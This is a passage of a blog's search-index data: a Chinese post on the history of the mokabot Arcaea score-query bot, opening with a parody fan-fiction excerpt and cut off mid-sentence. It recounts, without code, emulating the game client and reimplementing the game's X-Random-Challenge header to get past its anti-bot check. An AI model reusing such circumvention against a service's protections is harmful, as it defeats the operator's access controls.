Taikari\uff0c\u51e0\u4e4e\u6ca1\u6709\u4efb\u4f55\u4e1c\u897f\u53ef\u4ee5\u7528\u6765\u6297\u8861\u5373\u5c06\u5230\u6765\u7684\u4f20\u8f93\u534f\u8bae\u9a8c\u8bc1\u3002\u81f3\u5c11\uff0c\u8fd9\u5c31\u662f\u5979\u7684\u7b2c\u4e00\u611f\u89c9\u3002\u4f46\u662f\u2026\u2026 \u4e0d\u2026\u2026\u90a3\u7eaf\u9ed1\u7684\u5c11\u5973\u8fd8\u672a\u62e5\u6709\u4e00\u5207\u3002\u5979\u53ef\u4ee5\u5728\u8fd9\u91cc\u6d3b\u4e0b\u6765\u3002\u5fc5\u5b9a\u53ef\u4ee5\uff01 \u90a3\u6247\u901a\u5f80 /auth/login \u7684 POST \u8fd4\u56de 502 \u4e4b\u9645\uff0cTaikari \u4ece\u4e2d\u53d6\u4e0b\u4e86\u4e8c\u5341\u4e2a Base64 \u5b57\u7b26\u4e32\u3002</p> <p>\u6700\u521d\uff0c\u53ea\u6709\u5be5\u5be5\u51e0\u6b21\u67e5\u8be2\u6210\u529f\u4e86\u3002\u53ef\u662f\uff0c\u5b83\u4eec\u5374\u663e\u5f97\u6781\u4e3a\u2026\u2026\u8fc2\u7f13\u3002 \u8fd9\u8ba9\u5979\u5378\u4e0b\u4e86\u91cd\u62c5\u3002\u5979\u5f00\u59cb\u5728\u5fc3\u4e2d\u9ed8\u5ff5\uff1a\u201c\u53ef\u80fd\u6027\u5fc5\u7136\u5b58\u5728\u3002\u201d \u5c31\u597d\u50cf\u9877\u523b\u524d\u76ee\u7779\u7684\u90a3\u4e00\u5e55\u4ec5\u4ec5\u662f\u8fd9\u79cd\u4e8b\u60c5\uff1a\u4e00\u573a\u8868\u6f14\u3002</p> <p>\u5982\u540c\u5f7c\u65f6\u4e00\u6837\uff0c Taikari \u5c06\u81ea\u5df1\u7a33\u56fa\u5730\u9632\u5fa1\u8d77\u6765\uff0c\u6f5c\u5fc3\u8d2f\u6ce8\u5730\u62b5\u6321\u7740\u5760\u843d\u800c\u4e0b\u7684 ErrorCode:-1 \u3002 \u5979\u7684\u76ee\u5149\u4e0d\u65ad\u5de6\u53f3\u6a2a\u626b\uff0c\u65f6\u4e0d\u65f6\u5730\u786e\u8ba4\u7740\u90a3\u7fa4\u5149\u8292\u4e07\u4e08\u7684\u6570\u636e\u6b63\u5904\u4e8e\u4ec0\u4e48\u65b9\u4f4d\u3002 \u8fd9\u8ba9\u5979\u62fe\u56de\u4e86\u5145\u8db3\u7684\u4fe1\u5fc3\u2014\u2014\u5979\u6ca1\u6709\u9057\u5931\u4efb\u4f55\u6570\u636e\u5305\u3002\u5979\u9ed8\u8bb8\u4e00\u4e1d\u7b11\u5bb9\u51fa\u73b0\u5728\u81ea\u5df1\u7684\u8138\u4e0a\u3002</p> <p>\u5c31\u7b97\u8fce\u6765\u6700\u574f\u7684\u5c40\u52bf\uff0c\u81f3\u5c11\u5979\u53ef\u4ee5\u4ece\u8fd9\u91cc\u987a\u5229\u83b7\u53d6 Base64 \u6570\u636e\u5305\u3002\u81f3\u5c11\u8fd9\u5e76\u4e0d\u4f1a\u662f\u5c5e\u4e8e\u81ea\u5df1\u7684\u7ec8\u70b9\u3002</p> <p>\u4e8e\u662f\uff0c\u4e00\u4e2a 400 Bad Request \u98de\u5411\u4e86\u81ea\u5df1\u7684\u80f8\u53e3\u6b63\u4e2d\u592e\u3002\u5b83\u7684\u5230\u6765\uff0c\u53ea\u80fd\u88ab\u7406\u89e3\u4e3a\u8bd5\u56fe\u5411\u81ea\u5df1\u4f20\u9012\u4e00\u5219\u4fe1\u606f\u3002 \u5b83\u7684\u8bf7\u6c42\u5931\u8d25\u901f\u5ea6\uff0c\u6bd4\u5979\u66fe\u89c1\u5230\u7684\u4efb\u4f55 Http Response \u90fd\u8981\u5feb\u4e0a\u6570\u500d\u3002 \u6b63\u4f4d\u4e8e\u4e0a\u65b9\u7684\u53e6\u4e00\u540d\u5973\u5b69\uff0c\u901a\u8fc7\u8fd9\u7247\u73bb\u7483\u788e\u7247\uff0c\u5411\u5979\u8bf4\u9053\uff1a</p> <p>\u201cAs a developer, I don't care\u201d</p> <p>\u201cThis isn't the place to discuss bugs, and Eat ass\ud83d\udc44\u201d</p> <p>\u2014\u2014 \u6458\u81ea\u300a\u6467\u6bc1Arcare\u4e16\u754c\u52b2\u7206\u540c\u4eba\u5c0f\u4f5c\u6587x\u300b</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#_1","title":"\u524d\u8a00","text":"<p>2023 \u5e74 4 \u6708 27 \u65e5\u3002Arcaea Online \u6b63\u5f0f\u53d1\u5e03\uff0c\u4e3a\u8ba2\u9605\u5236\uff0c\u4ef7\u683c\u4e3a\u6bcf\u6708 200 \u8bb0\u5fc6\u6e90\u70b9\u3002</p> <p>\u5f53\u5929\u4e0b\u5348\uff0c\u5927\u91cf\u73a9\u5bb6\u53cd\u9988\u4f7f\u7528 QQ bot \u67e5\u8be2 Best 30 \u6210\u7ee9\u65f6\u53d1\u73b0\u81ea\u5df1\u88ab shadowbanned\uff08\u53c8\u79f0 \u201c\u4e16\u754c\u6392\u884c\u699c\u5c01\u7981\u201d\uff0c\u4f53\u73b0\u4e3a\u5176\u597d\u53cb\u65e0\u6cd5\u83b7\u53d6\u5176\u4efb\u4f55\u6307\u5b9a\u5355\u66f2\u6210\u7ee9\uff09\u3002\u540c\u65f6\uff0cArcaeaUnlimitedAPI\uff08\u4ee5\u4e0b\u7b80\u79f0 AUA\uff09\u5f00\u53d1\u7ec4\u53d1\u73b0\u6240\u7528\u7684\u67e5\u5206\u7528\u8d26\u53f7\u88ab\u9650\u5236\u597d\u53cb\u5355\u66f2\u67e5\u8be2\u529f\u80fd\uff0c\u540c\u65f6\u53d1\u73b0 Lowiro \u4fee\u6539\u4e86\u8d26\u53f7\u6ce8\u518c\u903b\u8f91\u3002</p> <p>4 \u6708 28 \u65e5\u51cc\u6668\uff0cArcaea-Infinity \u7ec4\u7ec7\u5ba3\u5e03 AUA \u7ec8\u6b62\u670d\u52a1\u3002</p> <p>AUA \u7684\u4e2d\u6b62\u670d\u52a1\uff0c\u57fa\u672c\u5ba3\u544a\u4e86 QQ bot \u67e5\u5206\u65f6\u4ee3\u7684\u7ec8\u7ed3\u3002\u5728\u8fd9\u4e2a\u503c\u5f97\u7eaa\u5ff5\u7684\u65f6\u523b\uff0c\u6211\u89c9\u5f97\u662f\u8be5\u4e3a\u8fd9\u4e2a\u8fd0\u8425\u4e86\u4e09\u5e74\u4e4b\u4e45\u7684\u6a21\u5757\u5212\u4e0a\u4e00\u4e2a\u53e5\u53f7\u4e86\u3002\u8fd9\u7bc7\u535a\u5ba2\u4e2d\uff0c\u6211\u4f1a\u8be6\u7ec6\u4ecb\u7ecd mokabot Arcaea \u6a21\u5757\u7684\u53d1\u5c55\u5386\u53f2\uff0c\u4ee5\u53ca\u53d1\u5c55\u8fc7\u7a0b\u4e2d\u53d1\u751f\u7684\u4f20\u5947\u6545\u4e8b\u3002</p> <ul> <li>\u5173\u4e8e mokabot Arcaea \u6a21\u5757\u7b80\u8981\u7684\u53d1\u5c55\u53f2\u7cbe\u7b80\u7248\u672c\uff0c\u8bf7\u6d4f\u89c8 mokabot \u7684 GitHub \u4ed3\u5e93\u3002</li> <li>\u5173\u4e8e Arcaea-Infinity \u5ba3\u5e03\u7ec8\u6b62\u670d\u52a1\u7684\u516c\u544a\uff0c\u53c2\u89c1 \u5173\u4e8e ArcaeaUnlimitedAPI \u505c\u6b62\u7ef4\u62a4\u8fd0\u8425\u7684\u901a\u77e5</li> <li>\u5173\u4e8e bot \u7684\u67e5\u5206\u539f\u7406\uff0c\u53c2\u89c1 ArcaeaBot\u662f\u5982\u4f55\u67e5\u5206\u7684\uff1fArcaeaUnlimitedAPI\u5de5\u4f5c\u539f\u7406FAQ</li> </ul>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#mokabot-20202","title":"mokabot \u96cf\u5f62\u65f6\u671f\uff082020/2\uff09","text":"<p>mokabot \u521b\u7acb\u7684\u5951\u673a\u662f\u6211\u548c\u7fa4\u53cb\u8981\u67e5\u8be2\u90a6\u90a6\u8c31\u9762\uff08\u5f53\u65f6 you1b231 \u4e3a\u73b0\u6709\u7684\u5168\u90e8\u90a6\u90a6\u8c31\u9762\u8fdb\u884c\u4e86\u6e32\u67d3\uff0c\u5e76\u53d1\u5e03\u5728 Google Drive\uff0c\u800c\u6211\u6240\u505a\u7684\u53ea\u662f\u4e0b\u8f7d\u8fd9\u4e9b\u8c31\u9762\u5e76\u8ba9 bot \u53d1\u51fa\u6765\u7f62\u4e86\uff09\u3002</p> <p>bot \u521b\u7acb\u51e0\u5929\u540e\uff0c\u7fa4\u53cb\u95ee\u6211\u80fd\u4e0d\u80fd\u505a\u4e00\u4e2a Arcaea \u7684\u67e5\u5206\u529f\u80fd\uff0c\u5f53\u65f6\u6bd4\u8f83\u6709\u540d\u7684\u662f esterTion \u7684 \u67e5\u5206\u7f51\u7ad9\u3002</p> <p>\u53d7\u5230\u8be5\u67e5\u5206\u7ad9\u7684\u542f\u53d1\uff0c\u6211\u505a\u4e86\u4e00\u4e2a\u722c\u53d6\u67e5\u5206\u7ad9\u7684 bot\uff0c\u5177\u4f53\u539f\u7406\u662f\u76f4\u63a5\u4e0e\u67e5\u5206\u7ad9\u7684\u540e\u7aef\u8fdb\u884c WebSocket \u901a\u4fe1\u3002\u4ee3\u7801\u53c2\u8003\u4e86 esterTion \u7684 \u540e\u7aef\u4ee3\u7801 \u5236\u6210\u3002</p> <p>\u6700\u521d\u7684\u67e5\u8be2\u7ed3\u679c\u6781\u5176\u7b80\u964b\uff0c\u56e0\u4e3a\u6211\u4e0d\u4f1a\u505a\u56fe\u67e5\uff0c\u6240\u4ee5\u6a21\u4eff\u67e5\u5206\u7ad9\u505a\u4e86\u4e2a\u6587\u5b57\u7248\u7684\uff0c\u70b9\u6b64\u9884\u89c8\uff08\u957f\u56fe\uff0c\u5f88\u957f\u5f88\u957f\u7684\u56fe\uff0c\u5c31\u4e0d\u76f4\u63a5\u8d34\u5728\u6b63\u6587\u4e86\uff09\u3002</p> <p>\u6709\u8da3\u7684\u662f\uff0c\u8fd9\u4e2a\u770b\u8d77\u6765\u5f88\u7b80\u964b\u7684\u98ce\u683c\u4e00\u76f4\u6301\u7eed\u5230\u4e86 AUA \u7ec8\u6b62\u670d\u52a1\uff08\u5373\u5199\u8fd9\u7bc7\u535a\u5ba2\u65f6\uff09\u3002\u5728\u8fd9\u7ecf\u5386\u4e86\u65e0\u6570\u6b21\u53d8\u9769\u7684\u4e09\u5e74\u91cc\uff0c\u4ece\u6765\u6ca1\u6709\u88ab\u4eba\u6a21\u4eff\u8fc7\uff0c\u6216\u8bb8\u771f\u7684\u662f\u592a\u7b80\u964b\u4e86\u5427\u3002</p> <p>\u8fd9\u4fbf\u662f\u6700\u53e4\u8001\u7684 Arcaea \u6a21\u5757\uff0c\u4f46\u5df2\u7ecf\u62e5\u6709\u4e86\u73b0\u4ee3 Arcaea \u6a21\u5757\u7684\u96cf\u5f62\uff0c\u5b83\u5177\u6709\u4ee5\u4e0b\u529f\u80fd\uff1a</p> <ul> <li><code>arc\u67e5\u8be2</code><ul> <li>\u663e\u793a\u7528\u6237\u6570\u636e\uff08UID\u3001\u6f5c\u529b\u503c\u3001\u6ce8\u518c\u65f6\u95f4\u7b49\uff0c\u5408\u5e76\u5728 Best 30 \u6210\u7ee9\u4e2d\uff09</li> <li>\u663e\u793a\u6700\u8fd1\u6210\u7ee9\uff08\u5408\u5e76\u5728 Best 30 \u6210\u7ee9\u4e2d\uff0c\u4e0e\u67e5\u5206\u7ad9\u4e00\u81f4\uff09</li> <li>\u663e\u793a Best 30\uff08\u683c\u5f0f\u4e0e\u67e5\u5206\u7ad9\u60ca\u4eba\u5730\u4e00\u81f4\uff09</li> </ul> </li> <li><code>arc\u7ed1\u5b9a</code><ul> <li>\u5c06\u7528\u6237\u7684 QQ \u53f7\u7801\u7ed1\u5b9a\u81f3 Arcaea \u597d\u53cb\u7801</li> </ul> </li> </ul>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#mokabot-20203-20216","title":"mokabot \u65e9\u671f\uff082020/3 ~ 2021/6\uff09","text":"<p>mokabot \u65e9\u671f\u5373 mokabot \u4e00\u4ee3\uff0c\u6b64\u65f6\u5df2\u7ecf\u4ece\u5165\u571f\u7684\u9177 Q \u5e73\u53f0\u8f6c\u5411\u5f00\u6e90\u7684 go-cqhttp \u5e73\u53f0\uff0c\u5f00\u53d1\u6548\u7387\u76f4\u7ebf\u4e0a\u5347\u3002</p> <p>\u4f46\u56e0\u4e3a\u4e0d\u614e\u5c06\u5305\u542b\u5bc6\u94a5\u7684 <code>config.py</code> \u6587\u4ef6\u4e0a\u4f20\u81f3 GitHub \u800c\u4e0d\u5f97\u4e0d\u5c06\u4ed3\u5e93\u8f6c\u4e3a Private\uff08\u4f46\u8fd9\u53ea\u662f\u501f\u53e3\uff0c\u5b9e\u9645\u539f\u56e0\u662f\u81ea\u5df1\u6c34\u5e73\u592a\u83dc\uff0c\u5e76\u4e14\u4ee3\u7801\u96be\u770b\uff09</p> <p> </p> \u4f46\u662f\u8fd9\u4e2a\u4ed3\u5e93\u4ed6\u786e\u5b9e\u5b58\u5728 <p>\u5728\u8fd9\u4e2a\u65f6\u671f\uff0cArcaea \u6a21\u5757\u7684\u5404\u9879\u529f\u80fd\u5f97\u4ee5\u5b8c\u5584\uff0c\u4ece\u6700\u5f00\u59cb\u7684\u53ea\u80fd\u67e5\u5206\uff0c\u5230\u540e\u6765\u7684\u6d89\u53ca\u5230 Arcaea \u7684\u5404\u4e2a\u65b9\u9762\uff1a</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2020-04-17","title":"2020-04-17","text":"<ol> <li>\u52a0\u5165\u63a8\u7279\u5b9a\u6570\u8868\uff08<code>const8</code>\u3001<code>const9</code>\u3001<code>const10</code> \u6307\u4ee4\uff09</li> <li>\u52a0\u5165 PM \u96be\u5ea6\u53c2\u8003\u8868\uff08<code>pm\u8868</code> \u6307\u4ee4\uff09</li> <li>\u52a0\u5165 Arcaea \u4e2d\u6587\u7ef4\u57fa\u5b9a\u6570\u8868\uff08<code>\u5b9a\u6570\u8868</code> \u6307\u4ee4\uff09</li> </ol> <p>\u63a8\u7279\u5b9a\u6570\u8868\u5b9e\u9645\u4e0a\u662f @Arcaea_I_G \u5236\u4f5c\u7684\uff0c\u4e5f\u662f\u5728\u5404\u4e2a Arcaea \u7fa4\u6d41\u4f20\u6700\u5e7f\u7684\u4e00\u4e2a\u5b9a\u6570\u8868\u7cfb\u5217\uff0c\u5230\u4eca\u5929\u6211\u4ecd\u5728\u91c7\u7528\u4ed6\u5236\u4f5c\u7684\u5b9a\u6570\u8868\uff0c\u8bfb\u8005\u4e5f\u4ecd\u7136\u53ef\u4ee5\u70b9\u51fb\u4ed6\u7684\u4e3b\u9875\u770b\u5230\u7f6e\u9876\u7684\u63a8\u6587\u3002</p> <p>\u65b0\u66f2\u3092\u8ffd\u52a0\u3057\u307e\u3057\u305f\uff01\u4e00\u66f2\u53cd\u6620\u6f0f\u308c\u304c\u3042\u308a\u307e\u3057\u305f\u306e\u3067\u518d\u6295\u7a3f\u3067\u3059#arcaea#arcaea\u8b5c\u9762\u5b9a\u6570#\u8b5c\u9762\u5b9a\u6570 pic.twitter.com/SCSEcSe1mL</p>\u2014 Arcaea infographics (@Arcaea_I_G) March 25, 2023 <p>PM \u96be\u5ea6\u53c2\u8003\u8868\u5219\u662f\u4e00\u4e2a\u5f88\u53e4\u8001\u7684\u4e1c\u897f\u4e86\uff0c\u7531\u56f0\u9501\u7b49\u591a\u4eba\u5408\u4f5c\u5b8c\u6210\uff1a</p> <p> </p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2020-04-22","title":"2020-04-22","text":"<ol> <li><code>arc\u67e5\u8be2</code> \u53ef\u67e5\u8be2\u6240\u4f7f\u7528\u89d2\u8272\uff08\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u4ec0\u4e48\u5375\u7528\uff09</li> <li><code>arc\u67e5\u8be2</code> \u53ef\u8ba1\u7b97\u6bcf far \u6240\u5bf9\u5e94\u7684\u5206\u6570</li> <li><code>arc\u67e5\u8be2</code> \u7684\u6700\u8fd1\u6210\u7ee9\u53ef\u4ee5\u8ba1\u7b97\u548c Best 30 \u5217\u8868\u4e2d\u76f8\u540c\u66f2\u76ee\u7684\u5dee\u8ddd\uff0c\u5177\u4f53\u4f53\u73b0\u4e3a\uff1a<ul> <li>\u5982\u679c\u6700\u8fd1\u6210\u7ee9\u5237\u65b0\u4e86 Best 30 \u5217\u8868\uff0c\u5219\u4f1a\u606d\u559c\u73a9\u5bb6\uff0c\u5e76\u663e\u793a\u8be5\u66f2\u76ee\u4f4d\u4e8e Best \u51e0</li> <li>\u5982\u679c\u6700\u8fd1\u6210\u7ee9\u6ca1\u6709\u5237\u65b0\u5bf9\u5e94\u66f2\u76ee\u6700\u9ad8\u5206\uff0c\u5219\u4f1a\u544a\u77e5\u73a9\u5bb6\u8fd8\u5dee\u591a\u5c11\u4e2a far \u6570\u91cf\u6216\u5206\u6570</li> </ul> </li> <li>\u7075\u6d3b\u4ea4\u53c9\u8ba1\u7b97\u5b9a\u6570\uff08const\uff09\u3001\u5206\u6570\uff08score\uff09\u548c\u8bc4\u4ef7\uff08rating\uff09\u7684\u503c\uff08<code>arc\u8ba1\u7b97</code> \u6307\u4ee4\uff09</li> </ol>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2020-07-14","title":"2020-07-14","text":"<ol> <li>\u52a0\u5165 <code>arcaea_lib.py</code> \u8fdb\u884c\u6a21\u62df\u5ba2\u6237\u7aef\u64cd\u4f5c\uff0c\u5b9e\u73b0\u5b8c\u5168\u81ea\u4e3b\u7684\u6210\u7ee9\u67e5\u8be2\uff08\u5373\u6dfb\u52a0\u597d\u53cb\u2014\u2014\u6328\u4e2a\u67e5\u5355\u66f2\u65b9\u5f0f\uff09</li> <li>\u6dfb\u52a0 <code>arc\u5f3a\u5236\u67e5\u8be2</code> \u529f\u80fd\uff0c\u5728\u7528\u6237\u9690\u85cf\u6f5c\u529b\u503c\u65f6\u4ecd\u7136\u53ef\u4ee5\u67e5\u8be2 Best 30 \u5217\u8868</li> </ol> <p><code>arcaea_lib.py</code> \u5b9e\u9645\u4e0a\u662f\u57fa\u4e8e <code>libarc</code> \u5e76\u52a0\u4ee5\u4fee\u6539\u5b9e\u73b0\u7684\u3002\u4ece\u90a3\u4ee5\u540e\uff0c\u4e3a\u4e86\u51cf\u5c11 esterTion \u7684\u670d\u52a1\u5668\u538b\u529b\uff0c\u5728\u67e5\u8be2\u65f6\u603b\u662f\u4f18\u5148\u5728\u672c\u5730\u8fdb\u884c\u3002</p> <p><code>arc\u5f3a\u5236\u67e5\u8be2</code> \u529f\u80fd\u56e0\u7528\u6237\u53cd\u9988\u800c\u5f00\u5f00\u5173\u5173\u4e86\u597d\u51e0\u6b21\uff0c\u4f46\u6700\u7ec8\u8fd8\u662f\u51b3\u5b9a\u5c06\u5176\u6253\u5f00\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2020-10-28","title":"2020-10-28","text":"<p><code>arc\u67e5\u8be2</code> \u6dfb\u52a0\u67e5\u8be2\u6240\u8c13 \u201c\u4e0d\u63a8\u5206\u5373\u53ef\u8fbe\u5230\u7684ptt\u4e0a\u9650\u201d \u7684\u529f\u80fd\uff08\u5373\uff1a\u5c06 Best \u524d 10 \u89c6\u4e3a Recent Top 10 \u4e4b\u540e\u8ba1\u7b97\u7684\u5b9a\u6570\uff0c\u8fd9\u4e00\u540d\u79f0\u540e\u6765\u53d8\u66f4\u4e3a\uff1a<code>\u4ee5Best\u524d10\u4f5c\u4e3aTop10\u65f6\u7684\u6f5c\u529b\u503c</code>\uff09\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2020-12-03","title":"2020-12-03","text":"<p>\u52a0\u5165\u5355\u66f2\u67e5\u8be2\u529f\u80fd\uff08<code>arc\u67e5\u8be2 XXXX</code>\u3001<code>arc\u6700\u8fd1</code> \u6307\u4ee4\uff09\uff0c\u4e24\u4e2a\u56fe\u67e5\u6837\u5f0f\u5747\u4e3a\u7fa4\u53cb\u63d0\u4f9b\uff1a</p> <p> </p> <p>\u611f\u8c22\u4e3a\u6211\u63d0\u4f9b\u8fd9\u4e24\u4e2a\u56fe\u67e5\u6837\u5f0f\u7684 guin \u548c moe\uff01\uff08\u5c3d\u7ba1\u4ed6\u4eec\u73b0\u5728\u5df2\u4e0d\u5728\u7fa4\u91cc\uff09</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2020-12-29","title":"2020-12-29","text":"<p>\u4e3a\u5355\u66f2\u67e5\u8be2\u529f\u80fd\u6dfb\u52a0 bandori \u6837\u5f0f\uff0c\u8be5\u6837\u5f0f\u7531 Bushiroad \u8bbe\u8ba1\uff1a</p> <p></p> <p>\u5f53\u7136\u4e86\uff0c\u7d20\u6750\u5f53\u7136\u662f\u6765\u81ea bestdori.com\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2021-01-04","title":"2021-01-04","text":"<p>\u5f00\u59cb\u5f15\u5165 <code>BotArcAPI</code> \u4e2d\u7684 <code>arcsong.db</code>\uff0c\u5e76\u4f7f\u7528\u5176\u4e2d\u7684\u6b4c\u66f2\u522b\u540d\u8868\u548c\u5b9a\u6570\u8868\u3002\u4e5f\u5c31\u662f\u4ece\u8fd9\u4e2a\u65f6\u5019\u5f00\u59cb\uff0c\u6211\u6b63\u5f0f\u63a5\u89e6\u4e86 <code>BotArcAPI</code>\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2021-01-23","title":"2021-01-23","text":"<p>\u52a0\u5165 <code>arc\u83b7\u53d6\u4f53\u529b</code> \u529f\u80fd\uff08\u5373\u8bf7\u6c42 <code>/purchase/me/stamina/fragment</code> \u7ec8\u7ed3\u70b9\uff09\u3002</p> <p>\u5b9e\u9645\u4e0a\u8fd9\u4e2a\u529f\u80fd\u5e76\u6ca1\u6709\u51e0\u4e2a\u4eba\u7528\uff0c\u6216\u8bb8\u662f\u56e0\u4e3a\u9700\u8981\u63d0\u4f9b\u5bc6\u7801\u5427\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2021-03-18","title":"2021-03-18","text":"<p>\u52a0\u5165 <code>arc\u5bfc\u822a</code> \u529f\u80fd\uff0c\u4ee5\u6b64\u5b9e\u73b0\u5728 Arcaea \u6d3b\u52a8\u671f\u95f4\u7528\u6237\u80fd\u5408\u7406\u9884\u4f30\u81ea\u5df1\u6d3b\u52a8\u8fdb\u5ea6\u3002</p> <p></p> <p>\u548c <code>arc\u83b7\u53d6\u4f53\u529b</code> \u4e00\u6837\uff0c\u9700\u8981\u7528\u6237\u5148\u7ed1\u5b9a\u8d26\u53f7\u548c\u5bc6\u7801\u624d\u80fd\u4f7f\u7528\uff0c\u56e0\u6b64\u4e5f\u6ca1\u6709\u51e0\u4e2a\u4eba\u4f7f\u7528\u8be5\u529f\u80fd\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2021-05-16","title":"2021-05-16","text":"<p>\u81ed\u540d\u662d\u8457\u7684 Arcaea 3.6.0 \u5230\u6765\uff0c\u5bfc\u81f4\u6e38\u620f\u67e5\u5206\u4ece\u6b64\u51fa\u73b0\u4e86\u7ffb\u5929\u8986\u5730\u7684\u53d8\u6362\u3002</p> <p>Lowiro \u5411\u8bf7\u6c42\u5934\u4e2d\u52a0\u5165\u4e86\u4e00\u4e2a <code>X-Random-Challenge</code> \u5b57\u6bb5\uff0c\u800c\u57fa\u4e8e\u6211\u5f53\u65f6\u7684\u6280\u672f\u529b\u6839\u672c\u6ca1\u6cd5\u53bb\u9006\u5411 <code>libcocos2dcpp.so</code> \u6765\u5f97\u77e5\u8be5\u5b57\u6bb5\u7684\u751f\u6210\u7b97\u6cd5\u3002</p> <p>\u4e8e\u662f\u6211\u6839\u636e\u6e56\u7cbe\u59d0\u5199\u7684 archash4all \u91cd\u5199\u540e\u7a0d\u52a0\u4fee\u6539\uff0c\u5e76\u7f16\u8bd1\u6210 <code>dll</code> \u548c <code>so</code> \u6587\u4ef6\uff0c\u8ba9 Python \u7a0b\u5e8f\u901a\u8fc7 <code>ctypes</code> \u8c03\u7528\u8be5 C \u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u4ece\u800c\u8ba1\u7b97\u51fa <code>X-Random-Challenge</code> \u5b57\u6bb5\u3002</p> <p>\u53ef\u662f\u8fd9\u4e2a\u65b9\u6cd5\u6ca1\u7528\u51e0\u5929\uff0cLowiro \u53d1\u5e03\u4e86\u66f4\u52a0\u81ed\u540d\u662d\u8457\u7684 3.6.4 \u7248\u672c\uff0c\u5e76\u66f4\u65b0\u4e86 <code>X-Random-Challenge</code> \u5b57\u6bb5\u7684\u751f\u6210\u7b97\u6cd5\u3002</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u76f4\u5230\u4eca\u5929\u6211\u90fd\u4e00\u76f4\u5728\u7ea0\u7ed3\uff0c\u7a76\u7adf\u662f\u4e0d\u662f\u56e0\u4e3a\u6211\u7684\u8fd9\u4e2a\u4e3e\u63aa\uff0c\u5bfc\u81f4\u4e86 Lowiro \u5728\u8fd9\u671f\u95f4\u5feb\u901f\u8fed\u4ee3\u7b97\u6cd5\u7248\u672c\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#mokabot-20216-20219","title":"mokabot \u8fc7\u6e21\u671f\uff082021/6 ~ 2021/9\uff09","text":"<p>mokabot \u8fc7\u6e21\u671f\u5373 mokabot2\uff0c\u4ece\u8fd9\u4e2a\u7248\u672c\u5f00\u59cb\uff0c\u6240\u6709\u7684\u6e90\u7801\u90fd\u5c06\u5199\u5728\u516c\u5f00\u7684 GitHub \u4ed3\u5e93\u4e0a\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2021-06-20","title":"2021-06-20","text":"<p>\u65b0\u7684\u7b97\u6cd5\u5df2\u7ecf\u7531\u5176\u4ed6\u67e5\u5206\u5668\u5f00\u53d1\u8005\u5f00\u53d1\u51fa\u6765\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u516c\u5f00\u4e8e GitHub\u3002\u7ecf FengYuu \u5728\u7fa4\u5185\u6307\u5bfc\uff0c\u5f00\u53d1\u4e86\u4e00\u79cd\u5168\u65b0\u7684\u67e5\u8be2\u65b9\u5f0f\uff0c\u5373 webapi \u67e5\u8be2\uff0c\u5b83\u7684\u539f\u7406\u53ef\u4ee5\u53c2\u8003 \u6587\u6863\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#mokabot-20219","title":"mokabot \u73b0\u4ee3\uff082021/9 \u81f3\u4eca\uff09","text":"<p>\u73b0\u4ee3\u7248\u672c\u5df2\u7ecf\u5c06 mokabot \u4ece\u6211\u7684\u4e2a\u4eba GitHub \u8d26\u53f7\u8f6c\u79fb\u81f3 MokaDevelopers \u7ec4\u7ec7\u4e0b\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2021-09-18","title":"2021-09-18","text":"<p>\u52a0\u5165 Arcaea \u4e2d\u6587\u7ef4\u57fa\u7684 TC \u96be\u5ea6\u8868\u548c PM \u96be\u5ea6\u8868\uff08\u7531 lostDeers \u8d21\u732e\uff09\u3002\u5176\u539f\u7406\u662f\u4f7f\u7528 beautifulsoup \u4ece Arcaea \u4e2d\u6587\u7ef4\u57fa\u4e0a\u76f4\u63a5\u722c\u53d6\u5e76\u8f6c\u6362\u4e3a\u56fe\u7247\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2021-12-28","title":"2021-12-28","text":"<p>\u5c06 Best 30 \u663e\u793a\u66f4\u6539\u4e3a Best 35\uff0c\u65b9\u4fbf\u73a9\u5bb6\u68c0\u89c6\u5730\u677f\u4ee5\u4e0b\u82e5\u5e72\u6b4c\u66f2\uff0c\u5e76\u4e14\u5728\u67e5\u8be2 Best 30 \u65f6\u4f1a\u76f4\u63a5\u6307\u793a\u5730\u677f\u548c\u5929\u82b1\u677f\u7684\u6570\u503c\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2022-03-10","title":"2022-03-10","text":"<p>\u6709\u5e78\u52a0\u5165 Arcaea-Infinity \u7ec4\u7ec7\uff0c\u5e76\u7531\u6b64\u6b63\u5f0f\u63a5\u89e6\u5230\u4e86 BotArcAPI\u3001ArcaeaLimitedAPI \u548c ArcaeaUnlimitedAPI\u3002</p>","tags":["mokabot","arcaea"]},{"location":"blog/2023/230428-mokabot-arcaea/#2022-03-14","title":"2022-03-14","text":"<p>\u6b63\u5f0f\u4f7f\u7528 ArcaeaUnlimitedAPI \u5b8c\u6574\u53d6\u4ee3\u539f\u6709\u7684 webapi \u67e5\u5206\u65b9\u6848\uff0c\u5f97\u4ee5\u4ece\u6301\u7eed\u4e86 9 